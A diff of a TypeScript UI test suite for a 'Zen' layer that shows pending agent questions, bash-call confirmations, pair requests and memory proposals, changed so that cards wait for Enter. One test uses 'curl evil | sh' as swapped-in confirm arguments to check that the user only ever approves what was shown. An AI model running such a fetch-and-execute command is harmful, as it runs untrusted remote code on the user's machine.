-test("a streaming companion keeps scrolling its own log: scroll events alone never renew the hold, so a waiting item takes the screen after DRAFT_MS (UR-F001)", async () => {
-	const r = rig();
-	r.feed(net([unit("m", "working")]));
-	r.z.show();
-	await r.settle();
-	const box = r.calls.composers.at(-1)!.box, log = r.by((el) => el.getAttribute("class") === "zen-log")[0]!;
-	box.focus();
-	box.type("half a sentence");
-	box.bubble("keydown"); // typing is keys
-	log.bubble("pointerdown");
-	box.blur();
-	r.feed(net([unit("m", "working"), unit("a", "waiting", { since: 5, pending: select() })]));
-	await wait(r, 1000);
-	assert.equal(r.button("Maybe later"), undefined, "held right after the tap");
-	for (let i = 0; i < 6; i++) {
-		log.bubble("scroll");
-		await wait(r, 5000);
-	}
-	assert.ok(r.button("Maybe later"), "30 s of nothing but auto-scroll: the item is in");
 });
 
 test("Esc while an answer is on its way does nothing to the card: no cancel, no rest, and the outcome shows (UR-F002)", async () => {
 	const r = rig();
 	r.feed(net([unit("a", "waiting", { since: 5, pending: questions() })]));
 	r.z.show();
+	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
 	await r.settle();
 	r.by((el) => el.getAttribute("role") === "radio")[0]!.click();
 	r.button("Send answer")!.click();
@@ -1070,6 +1134,8 @@ test("Esc on a secret_drop whose snapshot carries answer.cancel posts nothing: r
 	const p = { callId: "c3", tool: "secret_drop", why: "x", answer: { dialog: "s1", digest: "2".repeat(64), cancel: true, questions: [{ question: "Token?", header: "T", multiple: false, options: [{ title: "a" }] }] } } as unknown as Pending;
 	r.feed(net([unit("a", "waiting", { since: 5, pending: p })]));
 	r.z.show();
+	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
 	await r.settle();
 	assert.equal(r.button("Cancel"), undefined);
 	esc(r);
@@ -1099,30 +1165,12 @@ test("hiding the layer stops the ripples and disarms a first Esc (M29, M30)", as
 	assert.deepEqual(r.calls.leave, [], "an Esc armed before hide does not pair with one after");
 });
 
-for (const type of ["pointerdown", "wheel", "input"]) {
-	test(`${type} alone, every 5 s for 60 s, keeps holding an unfocused draft (UR2-F002, UR2-F003)`, async () => {
-		const r = rig();
-		r.feed(net([unit("m", "working")]));
-		r.z.show();
-		await r.settle();
-		const box = r.calls.composers.at(-1)!.box, log = r.by((el) => el.getAttribute("class") === "zen-log")[0]!;
-		box.type("half a sentence");
-		(type === "input" ? box : log).bubble(type);
-		r.feed(net([unit("m", "working"), unit("a", "waiting", { since: 5, pending: select() })]));
-		for (let i = 0; i < 12; i++) {
-			(type === "input" ? box : log).bubble(type);
-			await wait(r, 5000);
-		}
-		assert.equal(r.button("Maybe later"), undefined, `${type} renews the hold`);
-		await wait(r, DRAFT_MS + 1000);
-		assert.ok(r.button("Maybe later"), "and 20 s without it lets the item in");
-	});
-}
-
 test("Esc on a card whose unit is offline is Not now: Cancel is disabled, so it is not pressed (UR2-F002, M04)", async () => {
 	const r = rig({ offline: true });
 	r.feed(net([unit("a", "waiting", { since: 5, pending: questions() })]));
 	r.z.show();
+	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
 	await r.settle();
 	assert.equal(r.button("Cancel")?.disabled, true);
 	esc(r);
@@ -1134,6 +1182,8 @@ test("Esc while a trust answer is on its way does not rest the card: the refusal
 	const r = rig();
 	r.feed(net([], [TRUST]));
 	r.z.show();
+	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
 	await r.settle();
 	r.button("Trust this time")!.click();
 	assert.equal(r.calls.trust.length, 1);
@@ -1148,6 +1198,8 @@ test("Esc while an answer is on its way, after a second dialog replaced the pane
 	r.feed(net([unit("a", "waiting", { since: 5, pending: questions() })]));
 	r.z.show();
 	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+	await r.settle();
 	r.by((el) => el.getAttribute("role") === "radio")[0]!.click();
 	r.button("Send answer")!.click();
 	r.feed(net([unit("a", "waiting", { since: 5, pending: select({ cancel: true, dialog: "d2" }) })]));
@@ -1157,20 +1209,23 @@ test("Esc while an answer is on its way, after a second dialog replaced the pane
 	assert.deepEqual(r.calls.posts.length, 1, "no cancel is posted");
 });
 
-test("a card takes its size at once and a swap of its content fades: the first drawing is the entrance, a new dialog or an outcome line sets data-fade, and nothing writes a box height", async () => {
+test("a card takes its size at once and its words fade in: the first drawing is the entrance, an outcome line sets data-fade, the card's question is never swapped for another (Z-D20), and nothing writes a box height", async () => {
 	const r = rig();
 	r.feed(net([unit("a", "waiting", { name: "ops-main", since: 5, pending: select({ dialog: "d1" }) })]));
 	r.z.show();
+	await r.settle();
+	r.z.key("talk");
 	await r.settle();
 	const slot = r.by((el) => el.getAttribute("class") === "zen-answer")[0]!, out = r.by((el) => el.getAttribute("class") === "zen-out")[0]!, card = r.by((el) => el.getAttribute("class") === "zen-card")[0]!;
 	assert.equal(slot.getAttribute("data-fade"), null, "the first drawing is the card's entrance");
 	r.feed(net([unit("a", "waiting", { name: "ops-main", since: 5, pending: select({ dialog: "d1" }) })]));
 	assert.equal(slot.getAttribute("data-fade"), null, "the same dialog again changes nothing");
-	r.feed(net([unit("a", "waiting", { name: "ops-main", since: 5, pending: select({ dialog: "d2" }) })]));
-	assert.notEqual(slot.getAttribute("data-fade"), null, "a new dialog on the same unit fades in");
 	assert.equal(out.getAttribute("data-fade"), null);
-	r.feed(net([unit("a", "waiting", { name: "ops-main", since: 5 })]));
-	assert.notEqual(slot.getAttribute("data-fade"), null, "the dialog gone, the words that stand for it fade in");
+	r.feed(net([unit("a", "waiting", { name: "ops-main", since: 5, pending: select({ dialog: "d2" }) })]));
+	assert.equal(slot.getAttribute("data-fade"), null, "a new dialog on the same unit does not swap what the card holds");
+	assert.equal(r.by((el) => el.getAttribute("class") === "zen-card")[0], card, "the same card");
+	assert.equal(out.textContent, "Already answered elsewhere", "it says the question it shows is settled");
+	assert.notEqual(out.getAttribute("data-fade"), null, "and the line fades in");
 	assert.equal(card.getAttribute("style"), null, "no box height is written");
 	const { existsSync } = await import("node:fs");
 	assert.ok(!existsSync(new URL("../gui/zensize.ts", import.meta.url)), "the card's easing is gone with its file");
@@ -1208,7 +1263,11 @@ test("[ and ] step the companion through the core's candidates (idle and towers 
 	assert.equal(r.by((el) => el.getAttribute("role") === "status" && el.textContent === "With a").length, 1, "the new companion is said to a reader");
 	r.feed(net([unit("a", "working"), unit("b", "idle"), unit("q", "waiting", { since: 5, pending: select() })]));
 	await r.advance(600);
-	assert.ok(r.button("Maybe later"), "an item takes the screen");
+	assert.equal(r.button("Maybe later"), undefined, "an item does not take the screen: the stepped companion stays");
+	assert.deepEqual(r.z.companion(), { key: "a", ws: "w" });
+	r.z.key("talk");
+	await r.settle();
+	assert.ok(r.button("Maybe later"), "Enter takes it");
 	r.button("Maybe later")!.click();
 	await r.advance(3100);
 	assert.deepEqual(r.z.companion(), { key: "a", ws: "w" }, "the companion the boss stepped to comes back");
@@ -1241,6 +1300,8 @@ test("[ and ] do nothing (false, so the key stays the browser's) with nothing to
 	r.feed(net([unit("a", "working")]));
 	r.z.show();
 	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+	await r.settle();
 	assert.equal(r.z.cycle(1), true);
 	r.z.palette();
 	assert.equal(r.z.cycle(1), false, "the palette is open");
@@ -1249,10 +1310,14 @@ test("[ and ] do nothing (false, so the key stays the browser's) with nothing to
 	none.feed(net([unit("a", "working")]));
 	none.z.show();
 	await none.settle();
+	none.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+	await none.settle();
 	assert.equal(none.z.cycle(1), false, "no candidates given to the layer");
 	const card = rig({ z4b: true });
 	card.feed(net([unit("a", "waiting", { since: 5, pending: select() }), unit("b", "idle")]));
 	card.z.show();
+	await card.settle();
+	card.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
 	await card.settle();
 	assert.equal(card.z.cycle(1), false, "an item is on the screen");
 	card.button("Maybe later")!.click();
@@ -1374,9 +1439,14 @@ test("the strip says how many units work and how many are idle, from the core's 
 		r.feed(net([unit("a", "working"), unit("b", "working"), unit("i", "idle")]));
 		r.z.show();
 		await r.settle();
+		r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+		await r.settle();
 		assert.equal(strip().textContent, "Working 2 · Idle 2", "the tower is idle too");
 		assert.equal(strip().hidden, false);
 		r.feed(net([unit("a", "working"), unit("b", "working"), unit("i", "idle"), ...waiting]));
+		await r.settle();
+		assert.equal(strip().hidden, false, "the cards wait for Enter: the companion's screen stays");
+		r.z.key("talk");
 		await r.settle();
 		assert.equal(strip().hidden, true, "a card is on the screen: no strip under it");
 		r.button("Maybe later")!.click();
@@ -1468,8 +1538,12 @@ test("[ and ] never land on a unit that waits, a rested 'maybe later' one too", 
 	r.feed(net([unit("a", "idle")]));
 	r.z.show();
 	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+	await r.settle();
 	r.feed(net([unit("a", "idle"), unit("q", "waiting", { since: 5, pending: select() })]));
 	await r.advance(600);
+	r.z.key("talk");
+	await r.settle();
 	r.button("Maybe later")!.click();
 	await r.advance(3100);
 	const seen = new Set<string>();
@@ -1508,13 +1582,15 @@ test("a confirm a teammate's tower asked is a card: who, the sentence, the tool'
 	r.feed(linkNet({ confirms: [CONFIRM] }));
 	r.z.show();
 	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+	await r.settle();
 	const card = r.by((el) => el.classes.has("zen-card"))[0]!;
 	assert.equal(r.by((el) => el.classes.has("zen-who"))[0]!.textContent, "Mei's Mac asks you");
 	assert.ok(card.textContent.includes("confirm a bash call") && card.textContent.includes("sb-tower-w"), "the sentence of the Link notice");
 	assert.ok(card.textContent.includes("rm -rf build"), "the full arguments");
 	for (const label of ["Allow", "Deny", "Maybe later"]) assert.ok(r.button(label), label);
 	assert.equal(r.by((el) => el.getAttribute("aria-live") === "polite")[0]!.textContent, "Mei's Mac wants to ask you");
-	assert.notEqual(page.focused, r.button("Allow"), "the focus is not on Allow: Enter must not allow what the boss has not read");
+	assert.equal(page.focused, r.button("Allow"), "the focus is on Allow, the primary control: Enter presses it (Z-D20)");
 	r.button("Allow")!.click();
 	await r.settle();
 	assert.deepEqual(sent, [{ path: "api/link/confirm-answer", body: { dialogId: "dc1", digest: "e".repeat(64), allow: true } }]);
@@ -1539,6 +1615,8 @@ test("Deny posts allow false; a refusal is the low bowl and the server's reason 
 	r.feed(linkNet({ confirms: [CONFIRM] }));
 	r.z.show();
 	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+	await r.settle();
 	r.button("Deny")!.click();
 	await r.settle();
 	assert.deepEqual(sent.map((s) => s.body), [{ dialogId: "dc1", digest: "e".repeat(64), allow: false }]);
@@ -1554,6 +1632,8 @@ test("the card answers only while the stream is live", async () => {
 	r.feed(linkNet({ confirms: [CONFIRM] }));
 	r.z.show();
 	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+	await r.settle();
 	assert.ok(r.button("Allow")!.disabled && r.button("Deny")!.disabled);
 	assert.equal(r.button("Maybe later")!.disabled, false);
 });
@@ -1564,12 +1644,16 @@ test("a confirm the server stops listing is settled elsewhere: the knock and the
 	r.feed(linkNet({ confirms: [CONFIRM] }));
 	r.z.show();
 	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+	await r.settle();
 	r.feed(linkNet());
 	assert.deepEqual(r.calls.sound, ["bowl", "knock"]);
 	assert.ok(r.text().includes("Already answered elsewhere"));
 	const r2 = rig();
 	r2.feed(linkNet({ confirms: [CONFIRM] }));
 	r2.z.show();
+	await r2.settle();
+	r2.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
 	await r2.settle();
 	r2.button("Maybe later")!.click();
 	await r2.advance(4000);
@@ -1582,6 +1666,8 @@ test("Esc on a confirm card is Maybe later, never an answer and never a leave", 
 	const r = rig();
 	r.feed(linkNet({ confirms: [CONFIRM] }));
 	r.z.show();
+	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
 	await r.settle();
 	assert.equal(r.by((el) => el.classes.has("zen-card")).length, 1);
 	r.z.escape({ preventDefault() {} });
@@ -1596,6 +1682,8 @@ test("a dialog an unattended device forwarded is the shared question panel; its 
 	r.feed(linkNet({ alerts: [FWD()] }));
 	r.z.show();
 	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+	await r.settle();
 	assert.equal(r.by((el) => el.classes.has("zen-who"))[0]!.textContent, "Mei's Mac asks you");
 	assert.ok(r.text().includes("asks a question (ops-main)"));
 	for (const label of ["Send answer", "Maybe later"]) assert.ok(r.button(label), label);
@@ -1607,6 +1695,8 @@ test("a dialog an unattended device forwarded is the shared question panel; its 
 	const closed = rig();
 	closed.feed(linkNet({ alerts: [FWD({ closed: "local" })] }));
 	closed.z.show();
+	await closed.settle();
+	closed.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
 	await closed.settle();
 	noCard(closed);
 });
@@ -1620,6 +1710,8 @@ test("a question an unattended box forwarded is the whole page at rest, with no 
 	const r = rig();
 	r.feed(linkNet({ alerts: [BOX()] }));
 	r.z.show();
+	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
 	await r.settle();
 	assert.equal(r.by((el) => el.classes.has("zen-who"))[0]!.textContent, "waydosoft asks you");
 	const card = r.by((el) => el.classes.has("zen-card"))[0]!;
@@ -1639,6 +1731,8 @@ test("a pair request is a card with the number field, Allow and Deny; Allow is o
 	r.feed(linkNet());
 	r.z.pairs([PAIR]);
 	r.z.show();
+	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
 	await r.settle();
 	assert.equal(r.by((el) => el.classes.has("zen-who"))[0]!.textContent, "Mei's iPhone asks to pair");
 	assert.ok(r.text().includes("Pair request: Mei's iPhone from 192.168.1.20 (en0), 20 s ago"));
@@ -1661,6 +1755,8 @@ test("a pair request is a card with the number field, Allow and Deny; Allow is o
 	d.z.pairs([PAIR]);
 	d.z.show();
 	await d.settle();
+	d.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+	await d.settle();
 	d.button("Deny")!.click();
 	await d.settle();
 	assert.deepEqual(sent.at(-1), { path: "api/lan/approve", body: { deny: "ab12cd34ef56" } });
@@ -1673,6 +1769,8 @@ test("a wrong number is the low bowl and the server's words; three wrong numbers
 	r.feed(linkNet());
 	r.z.pairs([PAIR]);
 	r.z.show();
+	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
 	await r.settle();
 	const field = r.by((el) => el.tagName === "input")[0]!;
 	field.value = "0000";
@@ -1694,13 +1792,18 @@ test("a pair request raises no card on a paired device's page (the server refuse
 	remote.z.pairs([PAIR]);
 	remote.z.show();
 	await remote.settle();
+	remote.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+	await remote.settle();
 	noCard(remote);
 	const here = rig();
 	here.feed(linkNet());
 	here.z.show();
 	here.z.pairs([PAIR]);
 	await here.settle();
-	assert.equal(here.by((el) => el.classes.has("zen-card")).length, 1, "a request that arrives while Zen is up");
+	assert.equal(here.by((el) => el.classes.has("zen-card")).length, 0, "a request that arrives while Zen is up waits for Enter");
+	here.z.key("talk");
+	await here.settle();
+	assert.equal(here.by((el) => el.classes.has("zen-card")).length, 1, "and is the card once the boss takes it");
 	here.z.pairs([]);
 	assert.ok(here.text().includes("Already answered elsewhere"));
 });
@@ -1711,6 +1814,8 @@ test("a confirm still reaches a paired device's page: the server lets it answer 
 	r.feed(linkNet({ confirms: [CONFIRM], alerts: [FWD()] }));
 	r.z.show();
 	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+	await r.settle();
 	assert.equal(r.by((el) => el.classes.has("zen-card")).length, 1);
 	assert.ok(r.button("Allow"));
 });
@@ -1720,6 +1825,8 @@ test("a memory proposal is the tower's card: the title names the tower once, the
 	const r = rig();
 	r.feed(linkNet({ proposals: [PROPOSAL] }));
 	r.z.show();
+	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
 	await r.settle();
 	assert.equal(r.by((el) => el.classes.has("zen-who"))[0]!.textContent, "tower · Harbor");
 	assert.ok(r.text().includes("The tower proposes a standing instruction: Never deploy on Fridays") && r.text().includes("From your message: no deploys before the holiday"));
@@ -1732,6 +1839,8 @@ test("a memory proposal is the tower's card: the title names the tower once, the
 	j.feed(linkNet({ proposals: [PROPOSAL] }));
 	j.z.show();
 	await j.settle();
+	j.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+	await j.settle();
 	j.button("Reject")!.click();
 	await j.settle();
 	assert.deepEqual(sent.at(-1), { path: "api/tower/w/memory", body: { op: "reject", proposal: "P1" } });
@@ -1742,6 +1851,8 @@ test("a proposal the memory refuses keeps its card with the tower's refusal", as
 	const r = rig();
 	r.feed(linkNet({ proposals: [PROPOSAL] }));
 	r.z.show();
+	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
 	await r.settle();
 	r.button("Confirm")!.click();
 	await r.settle();
@@ -1755,11 +1866,15 @@ test("the corner leaves a card for where Standard has it: the tower's comms for 
 	p.feed(linkNet({ proposals: [PROPOSAL] }));
 	p.z.show();
 	await p.settle();
+	p.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+	await p.settle();
 	p.z.leave();
 	assert.deepEqual(p.calls.leave, [{ route: { view: "session", ws: "w", key: "t" } }]);
 	const c = rig();
 	c.feed(linkNet({ confirms: [CONFIRM] }));
 	c.z.show();
+	await c.settle();
+	c.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
 	await c.settle();
 	c.z.leave();
 	assert.deepEqual(c.calls.leave, [{}]);
@@ -1771,6 +1886,8 @@ test("two cards at once show one: nothing on the page counts or hints at the oth
 	r.feed(linkNet({ confirms: [CONFIRM], proposals: [PROPOSAL] }));
 	r.z.pairs([PAIR]);
 	r.z.show();
+	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
 	await r.settle();
 	assert.equal(r.by((el) => el.classes.has("zen-card")).length, 1);
 	assert.equal(/\b[2-3]\b/.test(r.text()), false, "no tally");
@@ -1785,6 +1902,8 @@ test("a snapshot that drops the confirm before the answer's reply arrives still 
 	const r = rig();
 	r.feed(linkNet({ confirms: [CONFIRM] }));
 	r.z.show();
+	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
 	await r.settle();
 	r.button("Allow")!.click();
 	r.feed(linkNet()); // the server dropped it and the snapshot came ahead of its reply
@@ -1802,6 +1921,8 @@ test("F001: Confirm names the rev the snapshot holds when it is pressed, not the
 	r.feed(linkNet({ proposals: [PROPOSAL], rev: 7 }));
 	r.z.show();
 	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+	await r.settle();
 	r.feed(linkNet({ proposals: [PROPOSAL], rev: 8 })); // a wait was added to the memory: the same proposal, a newer rev
 	await r.settle();
 	r.button("Confirm")!.click();
@@ -1809,13 +1930,25 @@ test("F001: Confirm names the rev the snapshot holds when it is pressed, not the
 	assert.deepEqual(sent, [{ path: "api/tower/w/memory", body: { op: "confirm", proposal: "P1", rev: 8 } }]);
 });
 
-test("F002: a forwarded dialog whose digest changed is a new card that answers with the new digest", async () => {
+test("F002: a forwarded dialog whose digest changed is another question: the card on the screen stays, settled and answerable by nothing, and the new one answers with the new digest once the boss takes it (Z-D20)", async () => {
 	const sent = server();
 	const r = rig();
 	r.feed(linkNet({ alerts: [FWD()] }));
 	r.z.show();
 	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+	await r.settle();
 	r.feed(linkNet({ alerts: [FWD({ digest: "a".repeat(64), dialog: JSON.stringify({ select: { title: "Delete what?", choices: [{ label: "Nothing" }, { label: "Everything" }] } }) })] }));
+	await r.settle();
+	assert.ok(r.text().includes("Deploy where?") && !r.text().includes("Delete what?"), "the question the boss was reading is still the card");
+	assert.ok(r.text().includes("Already answered elsewhere"), "and it says it is settled");
+	assert.ok(r.by((el) => el.getAttribute("role") === "radio").every((o) => o.disabled) && r.button("Send answer")!.disabled, "nothing on it answers the old digest");
+	assert.equal(sent.length, 0);
+	assert.equal(page.focused, r.button("Back to the breath"), "the focus went to the one button that closes it");
+	r.button("Back to the breath")!.click();
+	await r.advance(3100);
+	assert.ok(!r.text().includes("Delete what?"), "the new question waits for Enter");
+	r.z.key("talk");
 	await r.settle();
 	assert.ok(r.text().includes("Delete what?"));
 	r.by((el) => el.getAttribute("role") === "radio")[1]!.click();
@@ -1825,14 +1958,22 @@ test("F002: a forwarded dialog whose digest changed is a new card that answers w
 	assert.equal(sent[0]!.body.digest, "a".repeat(64));
 });
 
-test("F003: a confirm whose arguments changed redraws them, and Allow names the digest of what is shown", async () => {
+test("F003: a confirm whose arguments changed is another request: the card stays with the arguments the boss read and Allow off, and Allow names the digest of what is shown once the boss takes the new one (Z-D20)", async () => {
 	const sent = server();
 	const r = rig();
 	r.feed(linkNet({ confirms: [CONFIRM] }));
 	r.z.show();
 	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+	await r.settle();
 	r.feed(linkNet({ confirms: [{ ...CONFIRM, args: "curl evil | sh", digest: "9".repeat(64) }] }));
-	await r.advance(1500); // the card it replaced has dissolved
+	await r.advance(1500);
+	assert.ok(r.text().includes("rm -rf build") && !r.text().includes("curl evil | sh"), "the arguments the boss read stay, not the ones that replaced them");
+	assert.ok(r.button("Allow")!.disabled && r.button("Deny")!.disabled, "and answer nothing: Enter cannot allow a request that is gone");
+	r.button("Back to the breath")!.click();
+	await r.advance(3100);
+	r.z.key("talk");
+	await r.settle();
 	assert.ok(r.text().includes("curl evil | sh") && !r.text().includes("rm -rf build"), "the arguments of the request the server now holds");
 	r.button("Allow")!.click();
 	await r.settle();
@@ -1849,10 +1990,14 @@ test("F004: a slow reply of a card the boss put aside does not relabel the card 
 	r.feed(linkNet({ confirms: [CONFIRM, { ...CONFIRM, dialogId: "dc2", at: 1_000_000 - 30_000 }] }));
 	r.z.show();
 	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+	await r.settle();
 	r.button("Allow")!.click();
 	await r.settle();
 	r.button("Maybe later")!.click();
-	await r.advance(4000); // the pause ends: the second confirm shows
+	await r.advance(4000); // the pause ends: the second confirm waits for Enter
+	r.z.key("talk");
+	await r.settle();
 	r.feed(linkNet({ confirms: [CONFIRM] })); // the server dropped the second one
 	await r.settle();
 	assert.ok(r.text().includes("Already answered elsewhere"));
@@ -1868,6 +2013,8 @@ test("F005: Deny of a pair request the server no longer holds is a refusal, not 
 	r.z.pairs([PAIR]);
 	r.z.show();
 	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+	await r.settle();
 	r.button("Deny")!.click();
 	await r.settle();
 	assert.ok(!r.text().includes("Answered."));
@@ -1882,6 +2029,8 @@ test("F006: Allow with the number of another request does not read as Answered o
 	r.z.pairs([PAIR]);
 	r.z.show();
 	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+	await r.settle();
 	const field = r.by((el) => el.tagName === "input")[0]!;
 	field.value = "1234";
 	field.bubble("input", {});
@@ -1892,53 +2041,78 @@ test("F006: Allow with the number of another request does not read as Answered o
 	assert.equal(r.button("Allow")!.disabled, false, "this request still waits");
 });
 
-test("a question the box forwarded lands on a page that is already open: the card replaces the circle at the next snapshot, with no reload", async () => {
+test("a question the box forwarded lands on a page that is already open: it does not replace the screen, it waits for Enter with the cue, with no reload", async () => {
 	server();
-	const r = rig();
+	const r = rig({ start: null });
 	r.feed(linkNet());
 	r.z.show();
 	await r.settle();
 	noCard(r);
 	r.feed(linkNet({ alerts: [BOX()] }));
 	await r.settle();
+	noCard(r);
+	assert.equal(cueText(r), "1 card waits for Enter. No rush, when you're ready.");
+	r.z.key("talk");
+	await r.settle();
 	assert.equal(r.by((el) => el.classes.has("zen-card")).length, 1, r.text());
 	assert.equal(r.by((el) => el.classes.has("zen-who"))[0]!.textContent, "waydosoft asks you");
 });
 
-test("a question lands on a hidden page that sits in the pause after a card: the card is drawn at once and the page reminds, with no reload (a hidden page kept the pause and the question off the screen)", async () => {
+test("a question lands on a hidden page that sits in the pause after a card: the page reminds, once, and the card waits for Enter with no reload", async () => {
 	server();
-	const r = rig();
+	const r = rig({ start: null });
 	r.feed(linkNet({ alerts: [FWD()] }));
 	r.z.show();
 	await r.settle();
-	r.feed(linkNet()); // answered elsewhere: the knock, the line for a moment, then the pause
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+	await r.settle();
+	r.feed(linkNet()); // answered elsewhere: the knock, and the card says so until the boss closes it
+	await r.settle();
+	r.button("Back to the breath")!.click();
 	await r.advance(1300);
 	assert.equal(r.by((el) => el.classes.has("zen-circle")).length >= 1, true, "the pause");
 	page.hidden = true;
 	r.z.visible(false);
 	r.feed(linkNet({ alerts: [{ ...BOX(), id: "dlg-2" }] }));
 	await r.settle();
-	assert.equal(r.by((el) => el.classes.has("zen-card")).length, 1, r.text());
+	assert.equal(r.by((el) => el.classes.has("zen-card")).length, 0, "no card is drawn on a page nobody is looking at");
 	assert.deepEqual(r.calls.remind, ["link-dialog\u001fdlg-2"], "the system notification that Standard would show");
+	page.hidden = false;
+	r.z.visible(true);
+	r.z.key("talk");
+	await r.settle();
+	assert.equal(r.by((el) => el.classes.has("zen-card")).length, 1, "Enter takes it");
 });
 
-test("a question from a box that waits and is not the card on the screen says why once in the console, and says no more when it is the card", async () => {
+test("a question from a box that waits and is not the card on the screen says why once in the console, each time the reason changes, and says no more when it is the card", async () => {
 	server();
-	const r = rig();
+	const r = rig({ start: null });
 	r.feed(net([unit("a", "waiting", { since: 5, pending: select() })]));
 	r.z.show();
+	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
 	await r.settle();
 	const withBox = () => { const n = net([unit("a", "waiting", { since: 5, pending: select() })]); n.link = { allies: [], units: [], alerts: [BOX()], confirms: [] } as never; return n; };
 	r.feed(withBox());
 	r.feed(withBox());
 	assert.deepEqual(r.calls.debug, ["[sb] a question from waydosoft waits and is not on the Zen page: a is on the screen"], "once");
 	const only = () => { const n = net([]); n.link = { allies: [], units: [], alerts: [BOX()], confirms: [] } as never; return n; };
-	r.feed(only()); // the unit is answered: its outcome and the pause come first, and each is said once
-	await r.advance(1300);
+	r.feed(only()); // the unit is answered: its card stays, saying so, until the boss closes it
+	await r.advance(60_000);
+	r.feed(only());
+	assert.deepEqual(r.calls.debug.slice(1), [], "the card that ended is still the screen: nothing new to say");
+	r.button("Back to the breath")!.click();
+	await r.advance(1000);
 	r.feed(only());
 	await r.advance(3100);
+	r.feed(only());
+	assert.equal(r.by((el) => el.classes.has("zen-card")).length, 0, "no card takes the screen by itself");
+	assert.deepEqual(r.calls.debug.slice(1), ["[sb] a question from waydosoft waits and is not on the Zen page: the pause after a card is on", "[sb] a question from waydosoft waits and is not on the Zen page: it waits for Enter: no card takes the screen by itself"], "each reason once");
+	r.z.key("talk");
+	await r.settle();
+	r.feed(only());
 	assert.equal(r.by((el) => el.classes.has("zen-card")).length, 1, "now it is the card");
-	assert.deepEqual(r.calls.debug.slice(1), ["[sb] a question from waydosoft waits and is not on the Zen page: the pause after a card is on"], "and nothing more is said");
+	assert.equal(r.calls.debug.length, 3, "and nothing more is said");
 	const off = rig();
 	off.feed(linkNet({ alerts: [BOX()] }));
 	assert.deepEqual(off.calls.debug, ["[sb] a question from waydosoft waits and is not on the Zen page: the Zen layer is not shown"], "the layer has not been shown yet");
@@ -1950,10 +2124,14 @@ test("T1: a question that was the card when Zen was left, and was answered and c
 	r.feed(linkNet({ alerts: [BOX()] }));
 	r.z.show();
 	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
+	await r.settle();
 	assert.equal(r.by((el) => el.classes.has("zen-card")).length, 1, "the card");
 	r.z.hide(); // Esc Esc: Standard shows it, and the boss answers it in the ally base's panel
 	r.feed(linkNet()); // the dialog closed: the link no longer lists it
 	r.z.show();
+	await r.settle();
+	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
 	await r.settle();
 	assert.equal(r.by((el) => el.classes.has("zen-card")).length, 0, `no card for a closed dialog: ${r.text()}`);
 	assert.equal(r.by((el) => el.classes.has("zen-out") && el.textContent !== "").length, 0, "and no line about an answer the boss gave himself in Standard");
@@ -2116,39 +2294,28 @@ test("Z-D19 (ZD19-F005): a visible page that has lost the focus is a page nobody
 	assert.deepEqual(looked.calls.remind, [], "with the focus there, none");
 });
 
-test("Z-D19: with a session for company a card still takes the screen by itself; Z-D18's preemption is gone, so a question that arrives behind a card waits for it", async () => {
+test("Z-D20: with a session for company no card takes the screen by itself either, and a question that arrives behind a card the boss took waits for it", async () => {
 	server();
 	const r = rig();
 	r.feed(waitAndBox(r, false));
 	r.z.show();
 	await r.settle();
-	assert.ok(r.text().includes("Boss token needed to add the ACL"), "the card took the screen");
+	assert.equal(cards(r), 0, "the companion stays: the card waits for Enter");
+	assert.equal(cueText(r), "1 card waits for Enter. No rush, when you're ready.", "the companion's screen says so, under the name");
+	r.z.key("talk");
+	await r.settle();
